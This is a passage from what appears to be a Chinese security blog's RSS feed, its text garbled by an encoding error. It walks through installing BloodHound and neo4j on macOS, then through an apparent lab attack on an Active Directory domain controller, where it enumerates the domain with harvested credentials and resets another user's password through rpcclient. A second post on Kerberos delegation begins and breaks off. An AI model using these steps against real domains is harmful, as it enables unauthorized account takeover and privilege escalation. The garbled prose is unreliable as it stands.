&lt;p&gt;BloodHoundä»¥ç”¨å›¾ä¸çº¿çš„å½¢å¼ï¼Œå°†åŸŸå†…ç”¨æˆ·ã€è®¡ç®—æœºã€ç»„ã€Sessionsã€ACLsä»¥åŠåŸŸå†…æ‰€æœ‰ç›¸å…³ç”¨æˆ·ã€ç»„ã€è®¡ç®—æœºã€ç™»é™†ä¿¡æ¯ã€è®¿é—®æ§åˆ¶ç­–ç•¥ä¹‹é—´çš„å…³ç³»æ›´ç›´è§‚çš„å±•ç°åœ¨Red Teamé¢å‰è¿›è¡Œæ›´ä¾¿æ·çš„åˆ†æåŸŸå†…æƒ…å†µï¼Œæ›´å¿«é€Ÿçš„åœ¨åŸŸå†…æå‡è‡ªå·±çš„æƒé™&lt;/p&gt;
&lt;p&gt;å¹³æ—¶åœ¨åŸŸæ¸—é€ä¸­æ‹¿åˆ°äº†ä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼Œé™¤äº†æ‰«æå†…ç½‘èµ„äº§ã€ç¢°æ’hashç­‰çš„æ“ä½œï¼Œè¿˜æœ‰ä¸€ä¸ªå¾ˆå®¹æ˜“è¢«å¿½ç•¥çš„ä¸œè¥¿ï¼Œé‚£å°±æ˜¯å½“å‰ç”¨æˆ·æ€ä¹ˆèƒ½å¿«é€Ÿçš„ä»¥æœ€çŸ­çš„è·¯å¾„åˆ°è¾¾åŸŸæ§ã€‚&lt;/p&gt;
&lt;p&gt;ä¹‹å‰æœ‰å†™è¿‡ä¸€ç¯‡åŒ…å«BloodHoundçš„æ–‡ç« &lt;a href=&#34;https://xxe.icu/posts/pathfinder/&#34;&gt;pathfinder&lt;/a&gt;ï¼Œè¿™ç¯‡æ–‡ç« ä¸»è¦æ˜¯è®°å½•ä¸€ä¸‹MacOSä¸‹å®‰è£…BloodHoundã€‚&lt;/p&gt;
&lt;h1 id=&#34;è·å–åŸŸå†…ä¿¡æ¯&#34;&gt;è·å–åŸŸå†…ä¿¡æ¯&lt;/h1&gt;
&lt;p&gt;æ¯”å¦‚æˆ‘ä»¬ä½¿ç”¨ç”¨æˆ·æšä¸¾å¾—åˆ°ä¸€ä¸ªç”¨æˆ·supportï¼Œç”¨æˆ·å­˜åœ¨&lt;code&gt;AS_REPRoasting&lt;/code&gt;æ¼æ´ï¼Œæ‹¿åˆ°å¯†ç åç°åœ¨æˆ‘ä»¬ä½¿ç”¨BloodHoundè·å–ç›®æ ‡åŸŸçš„ä¿¡æ¯åˆ†æã€‚&lt;/p&gt;
&lt;h2 id=&#34;é‡‡é›†æ•°æ®&#34;&gt;é‡‡é›†æ•°æ®&lt;/h2&gt;
&lt;p&gt;å› ä¸ºæˆ‘è¿™é‡Œçš„ç¯å¢ƒæ˜¯ç›®æ ‡ä¸»æœºæœªå¼€æ”¾3389ï¼Œ445å…±äº«æ²¡æœ‰å†™æƒé™ï¼Œè€Œä¸”winrmä¹Ÿä¸èƒ½ç™»å½•ï¼Œæ‰€ä»¥åªèƒ½ç”¨pythonç‰ˆæœ¬çš„BloodHoundè¿›è¡Œè¿œç¨‹æ”¶é›†ä¿¡æ¯ï¼Œå…¶ä»–ç‰ˆæœ¬å¯ä»¥åˆ°https://bloodhound.readthedocs.io/ è¿›è¡Œä¸‹è½½ã€‚&lt;/p&gt;
&lt;p&gt;pythonç‰ˆæœ¬ä¸‹è½½ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/fox-it/BloodHound.py&#34;&gt;https://github.com/fox-it/BloodHound.py&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/fox-it/BloodHound.py.git
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; BloodHound.py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è·å–åŸŸçš„ä¿¡æ¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 BloodHound.py -c ALL -u support -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;#00^BlackKnight&amp;#39;&lt;/span&gt; -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ‰§è¡Œåä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆ4ä¸ªæ–‡ä»¶ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/bloodhound_under_macos/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;å®‰è£…neo4j&#34;&gt;å®‰è£…neo4j&lt;/h2&gt;
&lt;p&gt;ç°åœ¨æˆ‘ä»¬å¯¼å…¥åˆ°BloodHoundï¼Œå› ä¸ºmacOSå·²ç»é»˜è®¤å®‰è£…äº†jdkï¼Œç°åœ¨æˆ‘ä»¬å¼€å§‹å®‰è£…neo4j æ•°æ®åº“ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹è½½åœ°å€ï¼šhttps://neo4j.com/download-center/#community&lt;/p&gt;
&lt;p&gt;é€‰æ‹©Linux/Mac ç‰ˆæœ¬ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/bloodhound_under_macos/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;è§£å‹ï¼Œè¿›å…¥åˆ°binç›®å½•ï¼Œæ‰§è¡Œä¸‹é¢å‘½ä»¤å¯åŠ¨ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ ./neo4j console
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åä¼šå‘ç°ä¸‹é¢çš„æŠ¥é”™ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Starting Neo4j.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;WARNING! You are using an unsupported Java runtime.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;* Please use Oracle(R) Java(TM) 11, OpenJDK(TM) 11 to run Neo4j.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;* Please see https://neo4j.com/docs/ for Neo4j installation instructions.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Java HotSpot(TM) 64-Bit Server VM warning: Option UseBiasedLocking was deprecated in version 15.0 and will likely be removed in a future release.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åŸå› æ˜¯Javaçš„ç‰ˆæœ¬ä¸ç¬¦åˆï¼ŒæŸ¥çœ‹ç°åœ¨çš„Javaç‰ˆæœ¬ï¼Œå¯ä»¥å‘ç°æ˜¯16çš„ç‰ˆæœ¬ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ java -version
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;java version &amp;#34;16.0.1&amp;#34; 2021-04-20
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Java(TM) SE Runtime Environment (build 16.0.1+9-24)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Java HotSpot(TM) 64-Bit Server VM (build 16.0.1+9-24, mixed mode, sharing)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;macOSä¸‹åˆ‡æ¢Javaç‰ˆæœ¬ä¹Ÿå¾ˆæ–¹ä¾¿ï¼Œæˆ‘ä»¬åªéœ€è¦ä¿®æ”¹ç¯å¢ƒå˜é‡çš„&lt;code&gt;JAVA_HOME&lt;/code&gt;å‚æ•°å³å¯ï¼Œçœ‹ä¸‹æœ¬æœºå·²å®‰è£…çš„Javaç‰ˆæœ¬ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ /usr/libexec/java_home -V
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Matching Java Virtual Machines &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   16.0.1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;x86_64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Oracle Corporation&amp;#34;&lt;/span&gt; - &lt;span class=&#34;s2&#34;&gt;&amp;#34;Java SE 16.0.1&amp;#34;&lt;/span&gt; /Library/Java/JavaVirtualMachines/jdk-16.0.1.jdk/Contents/Home
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    11.0.11 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;x86_64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Oracle Corporation&amp;#34;&lt;/span&gt; - &lt;span class=&#34;s2&#34;&gt;&amp;#34;Java SE 11.0.11&amp;#34;&lt;/span&gt; /Library/Java/JavaVirtualMachines/jdk-11.0.11.jdk/Contents/Home
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    1.8.321.07 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;x86_64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Oracle Corporation&amp;#34;&lt;/span&gt; - &lt;span class=&#34;s2&#34;&gt;&amp;#34;Java&amp;#34;&lt;/span&gt; /Library/Internet Plug-Ins/JavaAppletPlugin.plugin/Contents/Home
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬ç°åœ¨éœ€è¦åˆ‡æ¢åˆ°11çš„ç‰ˆæœ¬ï¼Œä¸Šé¢æ˜¾ç¤ºåé¢çš„ç›®å½•æˆ‘ä»¬éœ€è¦ç”¨åˆ°ï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤å³å¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;JAVA_HOME&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/Library/Java/JavaVirtualMachines/jdk-11.0.11.jdk/Contents/Home&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å†é‡æ–°æŸ¥çœ‹Javaçš„ç‰ˆæœ¬ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ java -version
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;java version &lt;span class=&#34;s2&#34;&gt;&amp;#34;11.0.11&amp;#34;&lt;/span&gt; 2021-04-20 LTS
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Java&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;TM&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; SE Runtime Environment 18.9 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;build 11.0.11+9-LTS-194&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Java HotSpot&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;TM&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 64-Bit Server VM 18.9 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;build 11.0.11+9-LTS-194, mixed mode&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç°åœ¨å°±å¯ä»¥è¿è¡Œneo4jï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ ./neo4j console
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°å·²ç»è¿è¡ŒæˆåŠŸï¼Œ å¹¶ç»™å‡ºä¸€ä¸ªURLï¼Œè®¿é—®å¯ä»¥çœ‹åˆ° neo4j çš„ Web æ§åˆ¶å°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/bloodhound_under_macos/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;é»˜è®¤ç™»å½•è´¦å·ä¸º &lt;code&gt;neo4j/neo4j&lt;/code&gt;ï¼Œè¿™é‡Œç™»å½•åä¼šæç¤ºä½ ä¿®æ”¹å¯†ç ï¼Œè¾“å…¥æ–°å¯†ç å³å¯ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;å®‰è£…-bloodhound&#34;&gt;å®‰è£… BloodHound&lt;/h2&gt;
&lt;p&gt;åˆ°ä¸‹é¢çš„åœ°å€ä¸‹è½½æœ€æ–°ç‰ˆå³å¯ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/BloodHoundAD/BloodHound/releases/tag/4.1.0&#34;&gt;https://github.com/BloodHoundAD/BloodHound/releases/tag/4.1.0&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;macOSä¸‹é€‰æ‹© &lt;a href=&#34;https://github.com/BloodHoundAD/BloodHound/releases/download/4.1.0/BloodHound-darwin-x64.zip&#34;&gt;BloodHound-darwin-x64.zip&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä¸‹è½½åè§£å‹ï¼Œç›´æ¥ç‚¹å‡»è¿è¡Œï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/bloodhound_under_macos/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¾“å…¥åˆšæ‰æˆ‘ä»¬å¯†ç ç™»å½•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/bloodhound_under_macos/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç™»å½•æˆåŠŸåï¼Œæˆ‘ä»¬æŠŠä¹‹å‰è·å–åˆ°å››ä¸ªæ–‡ä»¶æ‹–å…¥åˆ° BloodHoundä¸­ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/bloodhound_under_macos/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;å®æ–½æ”»å‡»&#34;&gt;å®æ–½æ”»å‡»&lt;/h1&gt;
&lt;h2 id=&#34;æ•°æ®åˆ†æ&#34;&gt;æ•°æ®åˆ†æ&lt;/h2&gt;
&lt;p&gt;æ”»å‡»åœºæ™¯ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ç›®æ ‡ä¸»æœºæ˜¯ä¸€å°Windows Sever 2019çš„åŸŸæ§&lt;/li&gt;
&lt;li&gt;ç°åœ¨æ‹¿åˆ°ç”¨æˆ·supportçš„æƒé™ï¼Œä½†æ˜¯æ²¡æœ‰ç™»å½•ç›®æ ‡ä¸»æœºå’Œæ‰§è¡Œå‘½ä»¤çš„æƒé™&lt;/li&gt;
&lt;li&gt;æšä¸¾åˆ°ç›®æ ‡æœºå™¨ä¹Ÿå­˜åœ¨å¦å¤–ä¸€ä¸ªç”¨æˆ·AUDIT2020&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;æˆ‘ä»¬å¯¼å…¥æ•°æ®åï¼Œåœ¨å·¦ä¸Šè§’è¾“å…¥AUDIT2020ï¼Œç‚¹å‡»å·¦è¾¹çš„&lt;code&gt;Transitive Object Control&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/bloodhound_under_macos/9.png&#34; alt=&#34;9&#34;&gt;&lt;/p&gt;
&lt;p&gt;æŸ¥çœ‹åˆ°è¯¥ç”¨æˆ·æ˜¯å±äºåŸŸç”¨æˆ·ç»„ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/bloodhound_under_macos/8.png&#34; alt=&#34;8&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å†ä»å·¦ä¸Šè§’è¾“å…¥ç°æœ‰æƒé™çš„supportç”¨æˆ·ï¼Œç„¶åè®¾ç½®ä¸ºå¼€å§‹çš„èŠ‚ç‚¹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/bloodhound_under_macos/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
&lt;p&gt;å†æŸ¥è¯¢AUDIT2020ï¼Œå¹¶å³é”®é€‰æ‹©&lt;code&gt;Shortest Paths Here from Owned&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/bloodhound_under_macos/10.png&#34; alt=&#34;10&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°supportç”¨æˆ·å¯¹AUDIT2020ç”¨æˆ·æœ‰ä¿®æ”¹å¯†ç çš„æƒé™ï¼Œç‚¹å‡»è·¯å¾„å³é”®å¯ä»¥æŸ¥è¯¢æƒé™æ“ä½œè¯¦æƒ…ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/bloodhound_under_macos/11.png&#34; alt=&#34;11&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;æ”»å‡»&#34;&gt;æ”»å‡»&lt;/h2&gt;
&lt;p&gt;å…ˆæ¥è§£é‡Šä¸€ä¸‹è¿™ä¸ªå­˜åœ¨çš„æ¼æ´ç‚¹ï¼Œé¦–å…ˆä¸ºä»€ä¹ˆä¼šå­˜åœ¨è¿™ä¸ªæƒé™å‘¢ï¼Œæˆ‘ä»¬æ¥è¿˜åŸä¸€ä¸‹è®¾ç½®çš„åœºæ™¯ã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆåœ¨ADä¸­é€‰æ‹©ç”¨æˆ·ç»„åå³é”®é€‰æ‹©å§”æ´¾æ§åˆ¶ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/bloodhound_under_macos/12.png&#34; alt=&#34;12&#34;&gt;&lt;/p&gt;
&lt;p&gt;é€‰æ‹©ä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/bloodhound_under_macos/13.png&#34; alt=&#34;13&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œé€‰æ‹©é‡ç½®ç”¨æˆ·å¯†ç å³å¯ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/bloodhound_under_macos/14.png&#34; alt=&#34;14&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¸‹é¢æ˜¯ç›®æ ‡ä¸»æœºçš„ç«¯å£è¯¦æƒ…ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/bloodhound_under_macos/15.png&#34; alt=&#34;15&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¸Šé¢è¯´è¿‡è¿™ä¸ªåœºæ™¯æ²¡æœ‰åŠæ³•å»ç™»å½•ç›®æ ‡ä¸»æœºæ‰§è¡Œå‘½ä»¤æ€ä¹ˆåŠï¼Œä¸æ˜¯Remote Management Userä¸å¯ä»¥ä½¿ç”¨winrmæ“ä½œï¼Œå…·ä½“å¯ä»¥çœ‹&lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/winrm/authentication-for-remote-connections#enabling-or-disabling-authentication-options&#34;&gt;Authentication for Remote Connections&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡&lt;code&gt;rpcclient&lt;/code&gt;è¿›è¡Œæ“ä½œï¼Œå¯ä»¥å‚è€ƒæ–‡ç« &lt;a href=&#34;https://malicious.link/post/2017/reset-ad-user-password-with-linux/&#34;&gt;Reset AD user password with Linux&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;è¾“å…¥æˆ‘ä»¬çš„è´¦å·å¯†ç ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rpcclient -U &lt;span class=&#34;s2&#34;&gt;&amp;#34;support&amp;#34;&lt;/span&gt; 10.10.10.192
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¦ç”¨åˆ°çš„å‘½ä»¤æ˜¯&lt;code&gt;setuserinfo2&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Usage: setuserinfo2 username level password [password_expired]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¿®æ”¹å¯†ç ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;setuserinfo2 audit2020 23 &amp;#34;p@ssw0rd&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;è¿™é‡Œçš„23è¡¨ç¤º&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/cc245617.aspx&#34;&gt;this MSDN article&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¿®æ”¹æˆåŠŸäº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/bloodhound_under_macos/16.png&#34; alt=&#34;16&#34;&gt;&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>åŸŸæ¸—é€-å§”æ´¾æ”»å‡»åŸç†ä¸å®æˆ˜</title>
      <link>https://xxe.icu/ad_delegation.html</link>
      <pubDate>Thu, 03 Mar 2022 11:04:34 +0800</pubDate>
      
      <guid>https://xxe.icu/ad_delegation.html</guid>
      
        <description>&lt;h1 id=&#34;0x00-å‰è¨€&#34;&gt;0x00 å‰è¨€&lt;/h1&gt;
&lt;p&gt;åœ¨Windows 2000 Serveré¦–æ¬¡å‘å¸ƒActive Directoryæ—¶ï¼ŒMicrosoftå¿…é¡»æä¾›ä¸€ç§ç®€å•çš„æœºåˆ¶æ¥æ”¯æŒç”¨æˆ·é€šè¿‡Kerberoså‘Web Serverè¿›è¡Œèº«ä»½éªŒè¯å¹¶éœ€è¦ä»£è¡¨è¯¥ç”¨æˆ·æ›´æ–°åç«¯æ•°æ®åº“æœåŠ¡å™¨ä¸Šçš„è®°å½•çš„æ–¹æ¡ˆã€‚è¿™é€šå¸¸ç§°ä¸ºâ€œ KerberosåŒè·³é—®é¢˜â€ï¼Œå¹¶ä¸”è¦æ±‚è¿›è¡Œå§”æ´¾ï¼Œä»¥ä¾¿Web Serveråœ¨ä¿®æ”¹æ•°æ®åº“è®°å½•æ—¶æ¨¡æ‹Ÿç”¨æˆ·ã€‚&lt;/p&gt;
&lt;p&gt;åŸŸå§”æ´¾æ˜¯å¤§å‹ç½‘ç»œä¸­ç»å¸¸éƒ¨ç½²çš„åº”ç”¨æ¨¡å¼ï¼Œç»™å¤šè·³è®¤è¯å¸¦æ¥å¾ˆå¤§çš„ä¾¿åˆ©ï¼ŒåŒæ—¶ä¹Ÿå¸¦æ¥å¾ˆå¤§çš„å®‰å…¨éšæ‚£ï¼Œåˆ©ç”¨ å§”æ´¾å¯è·å–åŸŸç®¡ç†å‘˜æƒé™ï¼Œç”šè‡³åˆ¶ä½œæ·±åº¦éšè—çš„åé—¨åŸŸå§”æ´¾æ˜¯æŒ‡å°†åŸŸå†…ç”¨æˆ·çš„æƒé™å§”æ´¾ç»™æœåŠ¡è´¦å·ï¼Œä½¿å¾—æœåŠ¡è´¦å·èƒ½ä»¥ç”¨æˆ·æƒé™å¼€å±•åŸŸå†…æ´»åŠ¨ã€‚&lt;/p&gt;
&lt;p&gt;åŸŸå§”æ´¾æ˜¯æŒ‡ï¼šå°†åŸŸå†…ç”¨æˆ·çš„æƒé™å§”æ´¾ç»™æœåŠ¡è´¦å·ï¼Œä½¿å¾—æœåŠ¡è´¦å·èƒ½ä»¥ç”¨æˆ·æƒé™å¼€å±•åŸŸå†…æ´»åŠ¨ã€‚éœ€è¦æ³¨æ„çš„æ˜¯åœ¨åŸŸå†…å¯ä»¥å§”æ´¾çš„è´¦æˆ·æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯&lt;strong&gt;ä¸»æœºè´¦æˆ·&lt;/strong&gt;ï¼Œå¦ä¸€ç§æ˜¯&lt;strong&gt;æœåŠ¡è´¦æˆ·&lt;/strong&gt;(åŸŸç”¨æˆ·é€šè¿‡æ³¨å†ŒSPNä¹Ÿå¯ä»¥æˆä¸ºæœåŠ¡è´¦å·)ã€‚&lt;/p&gt;
